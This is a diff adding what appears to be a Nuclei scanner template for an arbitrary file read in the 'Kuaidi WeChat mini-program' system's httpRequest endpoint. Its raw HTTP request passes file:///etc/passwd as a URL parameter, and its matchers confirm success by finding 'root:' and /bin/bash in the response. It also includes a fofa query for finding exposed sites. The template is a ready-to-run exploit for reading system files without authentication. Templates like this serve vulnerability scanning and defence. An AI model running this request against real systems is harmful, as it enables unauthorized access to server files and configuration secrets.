@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 'root:'
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: kuaidiVX-httpRequest-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="static/default/newwap/lang/js/jquery.localize.min.js"
+        快递微信小程序系统 httpRequest 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 快递微信小程序系统 httpRequest 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489042&idx=1&sn=37f9e52fe423b2cec04b24335a1bcd83&chksm=c267a321f5102a37270d443ae92b913fe3468948dc8cad335c1410e029f5e964fe36affe8725&token=314927155&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
